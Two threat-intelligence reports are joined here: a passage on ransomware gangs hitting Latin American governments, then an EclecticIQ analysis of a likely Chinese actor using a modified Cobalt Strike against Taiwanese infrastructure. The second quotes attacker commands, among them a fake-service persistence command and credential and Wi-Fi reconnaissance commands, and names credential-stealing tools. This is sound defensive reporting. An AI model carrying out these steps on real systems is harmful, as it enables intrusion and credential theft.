Countries affected include Costa Rica, Peru, Mexico, Ecuador, Brazil, and Argentina, among others, all of which have publicly condemned Russia for invading Ukraine at the United Nations General Assembly (UNGA).
Some of these countries also voted to suspend Russia from the United Nations Human Rights Council (UNHRC) in early April 2022.
More recently, national emergencies have been issued regarding these attacks, such as in Costa Rica.
Ransomware groups involved in these attacks against governments in LATAM include Conti, ALPHV, LockBit 2.0, and BlackByte.
We have anecdotally identified a noticeable increase in initial access brokerage (IAB) services on top-tier Russian-language dark web and special access forums such as XSS and Exploit advertising low-cost, compromised network access methods related to entities in LATAM.
We have also observed several high-profile database leaks related to entities in LATAM on low-tier and mid-tier English-speaking forums such as BreachForums, with data dumps spiking in April 2022.
Additionally, we observed a significant increase in the sale of compromised credentials affecting LATAM government domains on dark web shops in Q1 and Q2 2022, relative to 2021.
These observations and trends could represent a paradigm shift in the ransomware and broader cybercriminal community related to unwritten rules and internal group policies on the targeting of government entities.
Key JudgmentsThe credibility of ransomware attacks on LATAM government entities is high, based on analysis of leaked sample data, threat actor indications, and historical activities, patterns, and trends related to tracked ransomware operators and affiliates.
If unaddressed, ransomware attacks on local, provincial, or federal government entities in LATAM could constitute a credible national and geopolitical security risk.
Entities in LATAM will remain attractive targets for ransomware operators and affiliates, as the region lacks the proper cybersecurity education, hygiene, and infrastructure to defend against such threats.
If attacks on LATAM government entities were to escalate to target infrastructure and critical services, this would pose a significant national security risk.
The most likely attack vectors employed by ransomware affiliates targeting LATAM government entities include the use of compromised valid credentials obtained via infostealer infection, initial access broker sale, or purchase on a dark web shop or marketplace.
The targeting of LATAM government entities could represent an initial shift away from internal cybercriminal policies on the targeting of governments worldwide.
Threat AnalysisAttack VectorsAs of May 26, 2022, we can not definitively determine the attack vector employed by ransomware operators and affiliates targeting LATAM government entities.
However, the most common method by which threat actors obtain initial access to networks is through the use of compromised valid credential pairs (T1078) and session cookies (T1539), which are often harvested from a successful infostealer infection (T1555, T1083) and sold by specialized initial access brokers on dark web and special-access sources.
This is the most likely avenue by which such threat actors gained access to compromised LATAM government networks.
These infostealers are often spread via phishing (T1566), spamming, the unintentional downloading of a malicious (T1204) or masquerading (T1036) file, and various other methods.
We have observed a minor, sustained increase in references to initial access sales and database leaks targeting LATAM government entities on dark web and special-access sources, beginning in approximately March 2022.
These observations are recorded anecdotally via Insikt Groups daily threat leads, analyst notes, and reports.
We have observed several threat actors, such as zirochka, on top-tier Russian-language forums XSS and Exploit auctioning compromised network accesses targeting entities in LATAM in bulk for relatively low prices (< $100).Figure 1: Timeline of ransomware attacks on LATAM government entities, mapped to references to LATAM on dark web and special-access sources (Source: Recorded Future)We have observed a slight increase in database dumps related to LATAM government entities, beginning in March 2022 and spiking on April 4, 2022.
We have also identified a significant increase in Q1 2022, beginning in February 2022, of references to domains owned by government entities in LATAM on dark web shops and marketplaces such as Russian Market, Genesis Store, and 2easy Shop, relative to the same time period in 2021.
These dark web shops and marketplaces specialize in the sale of compromised account credentials, remote desktop protocol (RDP) and secure shell (SSH) accesses, and infostealer malware logs that can be utilized to gain access to a victims network.
While we cannot determine any direct or causal link between the increased supply, frequency, and volume of advertisements targeting government entities and domains in LATAM to ransomware attacks targeting LATAM government entities, we believe that such trends and observations warrant further research to analyze and determine any possible correlation.
Figure 2: Examples of bulk initial access auctions targeting unspecified entities in LATAM (Source: Exploit Forum)Ransomware Gangs Targeting LATAM Government EntitiesWe have observed at least 4 high-credibility ransomware gangs targeting LATAM government entities during a period of time beginning on April 1, 2022.
These gangs include Conti, ALPHV (BlackCat), LockBit 2.0, and BlackByte.
These incidents constitute a significant escalation in the severity and impact of ransomware targeting.
Generally, ransomware affiliates avoid targeting healthcare facilities, K-12 educational institutions, international organizations and coalitions, and local, provincial, or federal governments.
The risk of negative publicity and stigmatization on dark web and special-access forums, mainstream media attention, and international law enforcement activity increases dramatically once targets in these industries are attacked.
It is possible that the targeting of LATAM entities by presumably Russian or Russian-speaking ransomware gangs could mark the beginning of a paradigm shift in which targets that were previously internally sanctioned by the group could now become viable targets for ransomware operations.
ContiThe most noteworthy of these targets is the attack on the government of Costa Rica by Conti, which resulted in the worlds first nationwide emergency declared as the result of a ransomware attack.
The attack, likely perpetrated and publicized by ransomware affiliate or affiliate group unc1756, also likely known as wazawaka, has garnered widespread media and law enforcement attention.
Since affiliates often work independently from the larger ransomware brand, it is possible that the attacks on Costa Rica that were claimed by Conti are not the work of the larger group.
Conti has claimed to have exfiltrated, encrypted, or destroyed approximately 1TB of sensitive information related to the administration and operations of several Costa Rican entities including the Ministry of Finance (hacienda[.]go[.]cr), the Ministry of Labor and Social Security (mtss[.]go[.]cr), the Development Fund and Family Allowances Bureau (fodesaf[.]go[.]cr), and the Interuniversity Headquarters of Alajuela, Costa Rica (siua[.]ac[.]cr).
Previous Conti posts also made vague references to controlling public utilities such as water and electricity, likely indicating indirectly that the group had access to Costa Rican industrial control system / supervisory control and data acquisition (ICS/SCADA) environments.
However, we are not able to verify these claims.
Conti followed their claims of an attack on Costa Rica with an attack on Peru that affected the General Directorate of Intelligence (digimin[.]gob[.]pe) and Ministry of Economics and Finance (mef[.]gob[.]pe).Figure 3: Announcements of attacks on Costa Rican and Peruvian government entities by the Conti Gang (Source: Conti.News)ALPHV (BlackCat)On April 16, 2022, the ransomware gang ALPHV (BlackCat) leaked an unspecified amount of compromised data related to the Municipality of Quito, Ecuador (quito[.]gob[.]ec).
This marked the first time that ALPHV targeted a government entity located in LATAM.
According to Ecuadorian media, this attack took several services offline for an unspecified amount of time.
This is a noteworthy event, as the Mayors Office of Municipality of Quito and State Attorney Generals Office confirmed that the initial attack caused the suspension of several critical government services, which caused an inconvenience to users who have not been able to carry out procedures.
As of April 25, 2022, all of the information claimed to have been exfiltrated by ALPHV is available to download for free on a .onion domain provided on the public-facing ALPHV extortion website with the same name.
Compromised information likely includes sensitive financial, legal, and political documents related to the operations and administration of the Municipality of Quito, Ecuador.
This information, if leveraged by an opportunistic threat actor, criminal, or nation-state, could prove to be damaging to Ecuadors national security.
Figure 4: Announcements of an attack on the Municipality of Quito, Ecuador from the BlackCat Ransomware Group (Source: ALPHV)LockBit
2.0On May 23, 2022, the LockBit 2.0 ransomware gang published to their blog leaked files related to the Secretary of Health of the State of Morelos, Mexico (saludparatodos[.]ssm[.]gob[.]mx), a breach that was initially disclosed on or around May 16, 2022.
This disclosure followed a previous claim on April 22, 2022 that LockBit 2.0 had compromised the network of the Secretary of State for Finance of Rio De Janeiro, Brazil (fazenda[.]rj[.]gov[.]br).
Neither of these incidents were widely reported in either Mexican or Brazilian media.
As of April 25, 2022, it is unclear whether the attacks resulted in a significant disruption of critical services related to the government entities.
Additionally, also as of April 25, 2022, all of the information claimed to have been exfiltrated by the LockBit 2.0 ransomware gang is available to download for free on the public-facing LockBit 2.0 extortion website called LockBit 2.0 Leaked Data.
The compromised information likely includes sensitive financial, legal, and political documents related to the operations and administration of these entities.
This information, if leveraged by an opportunistic threat actor, criminal, or nation-state, could prove to be damaging to the national security of Mexico and Brazil.
Figure 5: Announcements of attacks on Mexican and Brazilian government entities by the LockBit Gang (Source: LockBit Blog)BlackByteOn May 21, 2022, the BlackByte ransomware operators published claims on their public-facing extortion website named BlackByte Blog that they had compromised the internal network of the Comptroller General of the Republic of Peru (contraloria[.]gob[.]pe).
As of April 25, 2022, the BlackByte ransomware operators have not published any noteworthy data related to this government entity.
This attack has yet to be confirmed by any representatives of the Comptroller General of Peru and has not been extensively reported on in Peruvian or Spanish-language media.
As of this writing, we cannot determine if this attack caused the disruption of critical services provided by the comptroller general, although it is likely that any detected service disruptions on the domain are related to this attack.
Figure 6: Announcement of an attack on a Peruvian government entity by the BlackByte Ransomware Gang (Source: BlackByte Blog)Cybersecurity Hygiene and Trends in Latin AmericaAlthough most countries in LATAM have adopted a national cybersecurity strategy, there is still much work yet to be done in terms of improving the cyber capacity and security posture in both the private and public sectors; at the moment, only 3 LATAM countries (Brazil, the Dominican Republic, and Mexico) are members of the 30-plus-country ransomware task force.
The most effective investment would be to give residents in LATAM and the Caribbean in-person or remote access to IT security-oriented schools and training institutions.
Educational and training institutions in the region simply cannot keep up with the current demand for IT security professionals.
Investments in education, training, and apprenticeship programs would make the most difference in building capacity, closing the cyber skills gap, and getting more individuals into the cyber talent pipeline.
Supporting and encouraging younger individuals to seek an education and training within the cyber realm can drastically affect the skills shortage and improve public awareness on cyber threats; the region has been particularly affected by cybercrime and fraud during the pandemic.
While it is difficult to evaluate countries given their alternative approaches to cybersecurity, some have decided to leave cybersecurity to private firms while others have leaned on government agencies and the military to combat cybercriminals.
According to the Organization of American States (OAS) cybersecurity observatory, most LATAM countries are in the early stages of cybersecurity development.
As a result, there is still a lot to accomplish and implement in terms of cyber security policies in Central American and Caribbean countries.
Nevertheless, countries such as Argentina, Dominican Republic, Ecuador, Panama, and Peru, among others, are making significant efforts to advance their cyber capabilities.
However, there is a small list of countries with established policies, legal frameworks, institutional capacity, and human capital resources, including Brazil, Uruguay, Colombia, and Chile.
And although they are still developing, countries such as Brazil, Colombia, Chile, and Mexico have taken the lead in broadening their institutional capacities, including the development of cyber laws, policies, and regulations.
There is also increased expertise in the private sector, primarily the financial sector, within these nations.
MitigationsIt is crucial to maintain offline backups of your organizations data and ensure that these backups stay up to date to prevent data loss in the event of a ransomware infection.
Additionally, we recommend the following mitigations to reduce overall risk and impact:Ransomware often follows a specific pattern of behavior that can be detected with a robust threat intelligence system that is integrated with SIEM platforms.
Implement YARA rules such as the ones found in Recorded Future Hunting Packages to identify malware via signature-based detection or SNORT rules for endpoint-based detections.
The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP traffic associated with ransomware.
Network segmentation can halt the propagation of ransomware through an organizations network.
This solution involves splitting the larger network into smaller network segments and can be accomplished through firewalls, virtual - local area networks, or other separation techniques.
Implement intrusion detection / intrusion prevention (IDS/IPS) systems and endpoint detection and response (EDR) systems.
Provide robust anti-phishing training for employees and staff.
If remote access solutions are crucial to daily operations, all remote access services and protocols such as Citrix and RDP should be implemented with two-factor or multi-factor authentication.
Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.
Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers or use brute force password attacks.
Once inside the network, the threat actors move laterally and install ransomware on target machines, often disabling backups and other protections.
Through the use of process monitoring, monitor for the execution and command of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit.
Monitor for the creation of suspicious file modification activity, particularly large quantities of file modifications in user directories.
Consider keeping sensitive client information on systems that are disconnected from the internet or segmented from the rest of the corporate network.
Since ransomware will encrypt all files on a victim system and often will search for directories on the network (such as networked file shares) to also encrypt, moving highly sensitive customer data to a system with no internet access or access to the rest of the network will minimize ransomwares access to those files.
OutlookRansomware will likely continue to be incorporated into the attack methods of threat actors targeting public and private entities in LATAM due to their availability as ransomware-as-a-service (for non-technical threat actors) and highly successful infection rates.
Compromised accounts and networks are highly sought after by threat actors and will remain in high demand because they can be used in a number of attack vectors, including but not limited to account takeovers, identity theft, social engineering, credential stuffing, and brute forcing.
As LATAM is an up-and-coming region whose security posture is not as sophisticated or developed as some other regions for various reasons (geopolitical circumstances and developing infrastructure, among others), threat actors may view LATAM entities as easy targets for harvesting sensitive and financially lucrative accounts via infostealer infections.
As incident response teams in the region build up their security posture, threat actors are likely to continue to enhance and create infostealer variants to target organizations in LATAM with the intent of harvesting personal and corporate account login details and other important data. 
title: Chinese Threat Actor Used Modified Cobalt Strike Variant to Attack Taiwanese Critical Infrastructure url: https://blog.eclecticiq.com/chinese-threat-actor-used-modified-cobalt-strike-variant-to-attack-taiwanese-critical-infrastructure Executive Summary EclecticIQ researchers identified a malicious web server very likely operated by a Chinese threat actor used to target Taiwanese government entities, including critical infrastructure.
The command-and-control infrastructure was publicly exposed to the internet.
Based on log and meta data found on the server, EclecticIQ analysts assess with high confidence the threat actor performed offensive cyber operations, including reconnaissance, malware delivery, and post-exploitation against selected targets.
EclecticIQ analysts identified a modified version of Cobalt Strike known as "Cobalt Strike Cat"[1].
Researchers analyzed these logs and created a detailed map of the adversary's tactics, techniques, and procedures (TTPs).The threat actor primarily focused on exploiting four different remote code execution (RCE) vulnerabilities to target web services and heavily relied on open-source tools, some of which are exclusively available in Chinese underground forums.
The threat actor also engaged in brute-forcing against the victim's internal web services. 
Exposed Threat Actor Infrastructure Reveals
Offensive Tooling EclecticIQ analysts discovered a web server with the IP address 156[.]251[.]172[.]194, which was accessible to the public.
The server contained HTTP header data (SimpleHTTP/0.6 Python/3.8.10), indicating the use of a Python library called SIMPLEHTTPSERVER to serve the files and folders detailed in Figure 1. Figure 1 – Screenshot of exposed threat actor infrastructure showing available tools and target lists.. 
EclecticIQ analysts identified post-exploitation and reconnaissance tools on the server.
Most of the tools are open source.
Based on the event logs within a modified version of Cobalt Strike, analysts have determined with high confidence that Mandarin was set as the default language.
The identified tools include: Afrog: Vulnerability Scanning for Penetration Testing [2] CIPR: 
Converting domain name to IP address [3] Neo-reGeorg: Reverse proxy tool [4] Nuclei: Vulnerability scanner
[5] OneForAl: Subdomain collection tool [6] Fscan: Reconnaissance tool
[7] LaZagne: Recover stored passwords on a system [8] SharpCheckInfo: Situation awareness tool [9] HackBrowserData: Decrypting and exporting browser data [10] FRP: Reverse proxy tool
[11] ONE-FOX: Collection of Penetration Tools
[12] Targeted Attack Lifecycle The Targeted Attack Lifecycle is a methodology to map adversary tactics, techniques, and procedures (TTPs) in a structed way.
EclecticIQ analysts mapped identified TTPs to each phase of the life cycle (Figure 2) - beginning with the threat actor´s infrastructure (156[.]251[.]172[.]194) and continuing with the different tools used by the actor to compromise systems and perform lateral movement. 
Figure 2 – Targeted Attack Lifecycle of the threat actor. 
Reconnaissance of Exposed Webservices The threat actor utilized reconnaissance tools to scan and fingerprint systems exposed to the internet.
In some cases, the actor used a preconfigured (hard-coded) target lists, which is showing the intended victims.
EclecticIQ analysts validated many of these targets as real and existing systems.
Figure 3 shows an example of a target list created by the attacker, which mainly contains Taiwanese government entities.
This list served as input for OneForAll - a subdomain enumeration tool. 
Figure 3 – Files inside the exposed infrastructure under the OneForAll file path. 
After enumerating subdomains of the associated victim network, the threat actor uses automated vulnerability scanning tools including Nuclei and Afrog to identify potentially exploitable systems.
Figure 4 shows final report logs from Afrog and Nuclei found on the attacker infrastructure.
The threat actor utilized virtual sandboxes named "Test" to demonstrate cyber-attacks before executing them on a real victim device.
The IP addresses observed in these virtual sandboxes are tied to the same computer name, identified as DESKTOP-0TBCAC4.
The adversary also demonstrated an interest in exploring the public-facing network surface of public transport and utilities industries. 
Figure 4 – Completed reconnaissance and vulnerability scans. 
Initial Compromise Through Exploiting Publicly Facing Applications 
The threat actor utilized automated vulnerability discovery and reconnaissance techniques to scan a given target list, refine the selection and identify potential exploitable systems before commencing the attack.
Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:• CVE-2023-21839 Oracle WebLogic Server RCE
[13]• CVE-2021-3129 Laravel debug mode RCE
[14]• CVE-2020-2551 Oracle WebLogic RCE
[15]• CVE-2021-44228 Apache Log4j
[16] Figure 5 – BASH history logs of from the threat actor’s system showing exploitation of CVE-2020-2551. 
Establish Foothold by Modified Version of Cobalt Strike The threat actor utilized a modified version of Cobalt Strike 4.5, dubbed "Cobalt Strike Cat", to create a dedicated communication channel from the victim system and perform evasive post-exploitation steps.
Cobalt Strike Cat was initially shared on a Chinese-speaking cybersecurity forum called t00ls[.]com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.
Only registered users of t00ls[.]com could obtain the decryption key for the ZIP folder and access the tool.
Notably, t00ls[.]com is a private forum that can only be accessed by individuals who possess invitation codes for the site. 
Figure 6 – “I want to become a master hacker”.
Publication of Cobalt Strike Cat on t00ls[.]com. 
Figure 7 – Example user interface of Cobalt Strike Cat shared on a GitHub repository. 
Notable features of Cobalt Strike Cat include: 1. 
Evasion techniques to specially bypass Anti-Virus solution “360 Total Security”, which is a Beijing, China-registered internet security company mostly used in Asia-Pacific region.2. 
Option to use Google 2FA key during login to the command-and-control server as an attacker for further operational security. 
3. Modified stager designed to evade signature-based detection during malware execution.4. 
Patch for publicly available Cobalt Strike vulnerability tracked as CVE-2022-39197 [17].Figure 8 shows a small portion of Cobalt Strike Cat logs from the attacker´s infrastructure.
According to log data, a reverse shell was established from the remote victim device as SYSTEM-level privileges using a process named "bea.exe".
The attacker then changed the Cobalt Strike Cat beaconing frequency for behaviour-based evasion by sending the "sleep 10" command to the infected host and executed the "tasklist /SVC" command to list all running processes on the victim device. 
Figure 8 – Sample of Cobalt Strike Cat logs. 
The result of the "tasklist" command shows that the victim was using a commercial software called SONAS
[18].
SONAS is an application for remote monitoring and control of Internet of Things (IoT) hardware devices.
Analysts assess with high confidence that the compromised device was used to access CCTV cameras of the Directorate General of Highways in Taiwan. 
Analysis showed that the victim IP address was publicly serving a web service that contained a phpMyAdmin database.
The database used a weak password and was susceptible to brute-force attacks. 
Figure 9 shows the redacted victim DNS address, confirming that the web service was used by the Taiwanese government.
The IP addresses and the computer name matched the victim device name in the Cobalt Strike Cat logs. 
Figure 9 – PHPINFO page from victim web service. 
Internal Reconnaissance to Identify Lateral Movement Opportunities EclecticIQ researchers observed multiple internal network reconnaissance attempts after initial compromise.
These attempts are primarily performed with an open-source automated vulnerability scanning and brute forcing tool called FSCAN. 
Figure 10 showed that the threat actor used FSCAN (named as f.exe) to find possible vulnerabilities on internal network of infected device which can be used by threat actor to perform lateral movement: Figure 10 – Usage of FSCAN on a victim’s network. 
EclecticIQ researchers observed that the threat actor used the Windows command-line arguments to perform general reconnaissance against infected devices.
The following commands were identified: Command Line Argument Description query user || qwinsta Display information about logged-on users and their sessions. 
net user Displays information about user accounts. 
findstr /s /i
"DBPath" *.* Used to search for the string "DBPath" in all files within the current directory and its subdirectories. arp –a Address resolutions for remote systems. netsh wlan show profiles Display a list of all the wireless network profiles. 
dir %APPDATA%\Microsoft\Windows\Recent List of recently opened files and folders on the computer. 
Figure 11 shows some examples of commands executed by the threat actor on an infected host: Figure 11 – Executed reconnaissance commands on infected host. 
Escalate Privileges with Stolen Credentials The threat actor uses stolen passwords from valid accounts as the primary vector for privilege escalation.
The actor deployed various credential stealing techniques against compromised hosts to obtain user account passwords in NTLM hash format and saved credentials from web browser.
These passwords would allow the threat actor to escalate privileges using valid accounts if the accounts were privileged .
The Cobalt Strike Cat beacon logs (Figure 12) show that the actor uploaded LaZagne onto the infected device for credential harvesting purposes and deleted the LaZagne binary after execution to avoid detection from the user's side. 
EclecticIQ researchers observed LaZagne uploaded from the attacker device (“C:\Users\Test\Desktop\ONE-FOX集成工具箱_V1.0魔改版_by狐狸\gui_other\Cobalt_Strike_4.5\plugin\TaoWu\script\lazagne.exe”) to the victim device file path C:\Windows\Temp.
The actor leveraged ONE-FOX - a collection of pentest tools - to copy binaries from actor´s system to the victim. Figure 12 – Threat actor successfully obtained user account credentials in NTLM format. 
The threat actor utilized an open-source tool called HackBrowserData to export victim browser data, including passwords, history, cookies, bookmarks and download records from several web browsers. 
Figure 13 – Execution of Hack-browser-data on infected host. 
Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.
Windows services ran with the highest privilege, NT AUTHORITY\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence. 
Malicious service installation is accomplished via the below command line argument: sc create WindowsUpdate binPath= C:\Windows\Temp\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate When this command is executed on remote victim device, it will install a fake Windows service called “windowsupdate”.
This service executes a malicious binary (Cobalt Strike Cat payload) under “C:\Windows\Temp\svchost.exe” every time the victim device is started. 
Figure 14 – Installation of malicious Windows service. 
Move Laterally
Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.
This allowed the attacker to conduct vulnerability scans, general reconnaissance, and brute-force attacks on systems attached to the internal network of the infected device. 
Threat actor uploaded the fast reverse proxy (FRP) binary to the "C:\Windows\Temp" file path and then executed it on victim machine.
Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP. 
FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.]194) over port 2333. 
Figure 15 – Execution of FRP reverse SOCKS proxy on infected host. 
After establishing the reverse SOCKS proxy connection, the threat actor performed internal reconnaissance and brute forcing attempts on some of the internal FTP servers inside victim network. Victimology and Targeting Patterns EclecticIQ researchers assess with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.
Logs obtained from attacker infrastructure, such as target lists and metadata show that organizations in Taiwan account for the largest proportion of targets. 
According to event logs, on 02/09 at 08:51:43 UTC, EclecticIQ researchers have concluded with high confidence that the actor compromised an IOT device in the network of the Directorate General of Highways, MOTC in Taiwan
[19].
After this initial comprise the threat actor performed reconnaissance and credential harvesting from infected host, very likely to perform lateral movement as an end goal. 
Although the majority of activity was directed at Taiwanese government entities, researchers also observed other separate target lists containing IP addresses and domains associated to government websites from Egypt, Malaysia, Dominican Republic and the UAE also targeted recently by this threat actor. 
Figure 16 – Reconnaissance against Malaysian and Egyptian government entities. 
The reconnaissance against Malaysian and Egyptian government entities was carried out using a generic Python script that contained an author comment section with the handle "mwxiaojia."
However, there is no distinct evidence to conclusively attribute the cyber operations to an individual using that persona. 
Attribution EclecticIQ analysts assess with moderate confidence that the infrastructure was operated by a Chinese threat actor.
Analysts identified the following findings supporting the assessment: The modified version of Cobalt Strike event logs obtained from the threat actor infrastructure revealed additional IP addresses that very likely belong to the attacker and metadata that very likely show the origin of the attacker. 
File and folder names, file content and comments in threat actor tools were written in Mandarin. 
The timezone of attacker virtual sandbox 103[.]156[.]184[.]83 is in the UTC+08:00 timezone.
This time zone is used in all predominantly Chinese-speaking regions. 
Every successful login attempt made by the attacker using the default Cobalt Strike username 'neo' to access the command-and-control server was logged, along with the attacker's IP address.
EclecticIQ researchers observed that the threat actor used private proxy addresses from a Chinese underground proxy IP solution called 'Tigercloud Club' to conceal their real IP address. 
Some of tools used by the actor are exclusively available in Chinese underground forums. 
The identified adversary TTPs overlap with a previously known Chinese APT group called Budworm [20]. 
Cobalt Strike Cat event logs: Figure 17 – Event logs from Cobalt Strike Cat showing details about victim and threat actor. 
Figure 18 – Event logs from Cobalt Strike Cat showing details about the testing sandbox used by the threat actor. 
Mitigation and Prevention Strategies One of the main initial access vector is exploitation of publicly exposed web services.
EclecticIQ researchers recommend limiting the remote access of publicly available web services and consistently monitoring and installing available patches. 
Reconnaissance attempts on publicly exposed web services can be detected and stopped using a combination of techniques, such as: • Log analysis:
Monitoring and analyzing logs generated by the web server can help identify abnormal traffic patterns, such as repeated attempts to access a specific resource or an unusually high volume of requests from a single IP address.• Network traffic analysis: Network traffic analysis can help identify traffic that is not legitimate or is attempting to scan the network or web services.• Intrusion detection systems: Deploying an intrusion detection system (IDS) can help identify and alert administrators to malicious activities such as port scans or network sweeps.• Web application firewalls: Web application firewalls (WAF) can be used to protect web services from reconnaissance attempts by blocking or limiting access to resources and detecting and blocking known malicious patterns in web traffic. 
The threat actor used a variation of Cobalt Strike as a command and control (C2) server to send malicious commands into infected computers.
Some tips to help prevent such C2 connection attempts: • Monitor network traffic:
Monitor network traffic regularly to detect unusual activities or traffic patterns that may indicate C&C connections.• Deploy firewalls:
Deploy firewalls to block traffic from known C&C domains or IP addresses. 
The threat actor installed a second stage persistence backdoor on infected device by abusing Windows Services.
The actor then tried to dump User Account credentials via SAM database and attempted to access saved browser credentials.
There are several ways to use Windows Group Policy to avoid these kinds of post exploitation attempts: • 
Disable the "Create global objects" user right:
This user right allows non-administrative users to create global objects, including services.
By disabling this user right, you can prevent non-administrative users from creating services.• Restrict access to the Security Accounts Manager (SAM) file: The SAM file contains sensitive information, including user account passwords.
By default, only the SYSTEM account has access to the SAM file.
However, an attacker who gains administrative access to the system can potentially dump the SAM file and extract password hashes.
Restrict access to the SAM file, you can use the "Deny access to this computer from the network" user right.
By denying network access to the system, you can prevent attackers from using network-based attacks to dump the SAM file.• Disable password saving in web browser using Group Policy. 
Indicators Command and Control server – Exposed web server: • 156[.]251[.]172[.]194Threat Actor IPs based on Cobalt Strike Cat event logs (very likely proxy address): • 
193[.]233[.]204[.]73• 
103[.]156[.]184[.]89• 172[.]104[.]53[.]19• 103[.]156[.]184[.]83• 192[.]46[.]227[.]146• 140[.]99[.]149[.]35• 172[.]104[.]191[.]194Testing labs used by threat actor for planning the attack chain before executing on real victim device:• 172[.]105[.]117[.]179• 103[.]156[.]184[.]83Web service used to obtain bulk Proxy IP address from TigerCloud Club: • hxxp[://]38[.]54[.]50[.]246:10001 (https://gist.github.com/whichbuffer/250e36cd24357460fd2b1653091a3e9f)MD5 Hash:• d0139fda662f3ca949dd335c30573fa2 modify.exe • 
996c3eb5c21a20dd13b7ceee6c80b673 f3p.exe • 825c126e8547fbb01ff21d2100343bd2 run.ini • 73255c8357afd671c2256360d0be69cd lazagne.exe • c72e18c26307bc50d4936c0f5f0df36b svchost.exe (modified Cobalt Strike)• b7b1d390baaf579925ec6a33b6beeec8 hack-browser-data.exe • 03f45692db10fe291de65f15ca9761af frpcx.exe • a284c8b14e4be0e2e561e5ff64e82dc7 fscan.exe • 0b9e8fca5dc4775964492d7d333da25d svchost.exe (modified Cobalt Strike) MITRE ATT&CK Exploit Public-Facing Application – T1190 Exfiltration Over C2 Channel - T1041 OS Credential Dumping: Security Account Manager - T1003.002 OS Credential Dumping: LSASS Memory - T1003.001 
Proxy: Internal Proxy - T1090.001 Brute Force - T1110 Active Scanning:
Scanning IP Blocks - T1595.001 Credentials from Password Stores: Credentials from Web Browsers - T1555.003 Create or Modify System Process: Windows Service - T1543.003 Remote Services: Windows Remote Management - T1021.006 Active Scanning: Vulnerability Scanning - T1595.002 System Network Configuration Discovery - T1016 About EclecticIQ Intelligence & Research Team EclecticIQ is a global provider of threat intelligence, hunting, and response technology and services.
Headquartered in Amsterdam, the EclecticIQ Intelligence & Research Team is made up of experts from Europe and the U.S. with decades of experience in cyber security and intelligence in industry and government. 
We would love to hear from you.
Please send us your feedback by emailing us at research@eclecticiq.com. 
You might also be interested in: Russian Malware Network Dismantled; Iranian Threat Actors Attack PaperCut Servers Polish Healthcare Industry Targeted by Vidar Infostealer Likely Linked to Djvu Ransomware Introducing EclecticIQ Intelligence Center 3.0 References [1] “TryGOTry/CobaltStrike_Cat_4.5:
猫猫Cs:基于Cobalt Strike[4.5]二开 (原dogcs二开移植).”
https://github.com/TryGOTry/CobaltStrike_Cat_4.5 (accessed Apr. 25, 2023). 
[2] zan8in, “afrog.”
Apr. 28, 2023.
[Online].
Available: https://github.com/zan8in/afrog (accessed: Apr. 28, 2023). 
[3] “cIPR/cmd/cIPR at main · canc3s/cIPR,” GitHub.
https://github.com/canc3s/cIPR (accessed Apr. 28, 2023). 
[4] “L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg.”
https://github.com/L-codes/Neo-reGeorg/tree/master (accessed Apr. 28, 2023). 
[5] “projectdiscovery/nuclei: Fast and customizable vulnerability scanner based on simple YAML based DSL.”
https://github.com/projectdiscovery/nuclei (accessed Apr. 28, 2023). 
[6] J. Ling, “OneForAll.”
Apr. 26, 2023.
Available: https://github.com/shmilylty/OneForAll (accessed: Apr. 26, 2023). 
[7] 影舞者, “fscan.”
Apr. 28, 2023. 
Available: https://github.com/shadow1ng/fscan (accessed: Apr. 28, 2023). 
[8] AlessandroZ, “The LaZagne Project !!!”
Available: https://github.com/AlessandroZ/LaZagne (accessed: Apr. 28, 2023). 
[9] “SharpCheckInfo/README.md at master · uknowsec/SharpCheckInfo,” GitHub.
https://github.com/uknowsec/SharpCheckInfo (accessed Apr. 28, 2023). 
[10] ᴍᴏᴏɴD4ʀᴋ, “HackBrowserData.”
Available: https://github.com/moonD4rk/HackBrowserData (accessed: Apr. 28, 2023). 
[11] fatedier, “frp.”
Available: https://github.com/fatedier/frp (accessed: Apr. 28, 2023). 
[12] 雨苁, “ONE-FOX渗透测试集成工具箱_V1.0魔改版 by狐狸,” :Japanese_symbol_for_beginner:雨苁ℒ:Japanese_symbol_for_beginner:, Aug. 22, 2022.
https://www.ddosi.org/one-fox/ (accessed Apr. 28, 2023). 
[13] “NVD - CVE-2023-21839.”
https://nvd.nist.gov/vuln/detail/CVE-2023-21839 (accessed Apr. 28, 2023). 
[14] “NVD - CVE-2021-3129.”
https://nvd.nist.gov/vuln/detail/CVE-2021-3129 (accessed Apr. 28, 2023). 
[15] “NVD - CVE-2020-2551.”
https://nvd.nist.gov/vuln/detail/CVE-2020-2551 (accessed Apr. 28, 2023). 
[16] “NVD - CVE-2021-44228.”
https://nvd.nist.gov/vuln/detail/CVE-2021-44228 (accessed Apr. 28, 2023). 
[17] “NVD - CVE-2022-39197.”
https://nvd.nist.gov/vuln/detail/CVE-2022-39197 (accessed Apr. 28, 2023). 
[18] “SONAS 松山科技,” 開啟無接觸接待體驗與旅程, Feb. 12, 2023. /
(accessed May 08, 2023). 
[19] “Directorate General of Highways, MOTC.” https://www.thb.gov.tw/en/ (accessed Apr. 28, 2023). 
[20] “Budworm: Espionage Group Returns to Targeting U.S. Organizations.”
https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/budworm-espionage-us-state (accessed May 08, 2023). 
